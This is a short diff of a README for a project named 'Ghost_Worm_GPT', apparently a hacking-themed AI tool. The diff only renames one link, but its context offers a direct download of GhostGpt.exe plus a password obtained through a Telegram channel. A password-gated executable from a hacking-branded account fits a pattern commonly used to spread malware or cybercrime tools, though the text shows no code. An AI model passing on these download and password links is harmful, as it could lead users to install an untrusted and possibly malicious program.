@@ -24,7 +24,7 @@ It features a lock-screen authentication system, a dark-themed terminal UI, and 
 
 [Click Here For Download](https://github.com/cyber-ghost-hacking/Ghost_Worm_GPT/releases/download/%23GhostGPT/GhostGpt.exe)
 
-[Get Password to CLick](https://t.me/Sigma_Cyber_Ghost)
+[Get Password](https://t.me/Sigma_Cyber_Ghost)
 
 ## 🌐 Connect With Us
 
